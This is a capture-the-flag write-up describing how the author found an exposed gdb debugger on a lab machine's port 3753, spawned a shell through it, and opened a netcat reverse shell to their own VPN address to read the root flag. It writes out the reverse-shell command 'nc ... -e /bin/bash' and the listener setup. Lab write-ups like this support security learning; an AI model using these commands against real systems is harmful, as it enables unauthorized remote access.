# Target 10.0.50.160
This was an IP target machine and I could get just one flag in this target.
I caputed the root flag under /root/ETSCTF directory.

## Steps I followed to find relevant information and flags
The first step I did was to click on the dashboard of the hackmex website in order to see if there was a web service enabled (typically it opens in port 80 as default) in that IP.

Since it was not a web based target I needed to find out which ports where opened in order to know what to do afterwards.

### Network discovery
Firstly, as recon/enumeration step , I used the incredible bash script from this [repo](https://github.com/21y4d/nmapAutomator). It automates a lot of the flags of nmap utility to make recon/enumeration and can be running in the background.

The only opened port was ```3753```.

```bash
PORT     STATE SERVICE      VERSION
3753/tcp open  nattyserver?
```
Secondly, I tried to enter with my web browser into that specific port, but only the following code was displayed as raw text in the html file:

```
     Copyright (C) 2016 Free Software Foundation, Inc.
     License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
     This is free software: you are free to change and redistribute it.
     There is NO WARRANTY, to the extent permitted by law. Type "show copying"
     "show warranty" for details.
     This GDB was configured as "x86_64-linux-gnu".
     Type "show configuration" for configuration details.
     reporting instructions, please see:
     <http://www.gnu.org/software/gdb/bugs/>.
     Find the GDB manual and other documentation resources online at:
     <http://www.gnu.org/software/gdb/documentation/>.
     help, type "help".
     Type "apropos word" to search for commands related to "word".
     (gdb) 

```
It was obviously a gdb debbuger.


### Reverse Shell
So, I decided to use [netcat](http://netcat.sourceforge.net/) utility for reading from and writing to that specific port (that was using tcp) . 

After I typed a few commands unsucessfully, It came to my mind that I hadn't tried ```shell``` command yet to get the shell promp of the machine. And voila! by typing the previous command I could get access to the shell of the machine. I tried several commands but the shell was really unestable.

Then, I did a **Reverse Shell** (in which the target machine communicates back to the attacking machine) to have a stabler shell.

#### Step 1
I set up a netcat listener on port ```4444``` by typing the following command:

```bash
$ nc -lvp 4444
```

<img src="https://res.cloudinary.com/dxbnpu2rx/image/upload/v1602823070/1_ublzv6.png"/>

Where the flags are:
```
-l: Listen mode (default is client mode)
-v: Be verbose
-p : specify the port
```

#### Step 2

In the target machine I typed : 

```bash
$ nc 10.10.0.106 4444 -e /bin/bash
```
<img src="https://res.cloudinary.com/dxbnpu2rx/image/upload/v1602826824/2_g5fulv.png"/>

Where:

```
10.10.0.106 : Was my VPN IP during the ctf
4444 : port to establish connection
-e : Program to execute after connection occurs, connecting STDIN and STDOUT 
to the program
```
#### Step 3

I returned to my local terminal in which the port listener was opened and the first message confused me a bit: ```lookup failed```. So, I thought: this didn't work. But when I typed ```id``` command, it returned me the user name and real user id.

<img src="https://res.cloudinary.com/dxbnpu2rx/image/upload/v1602828118/3_nr8orh.png"/>

At this point to find the flag I just typed:
```bash
$ python
```
```python
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.

>>>print open("/root/ETSCTF", "r").read()
```
And voila!! The flag was printed. Since I did not take note of the flag I'm unable to share it, but as this was a root flag I got **1500 points**!
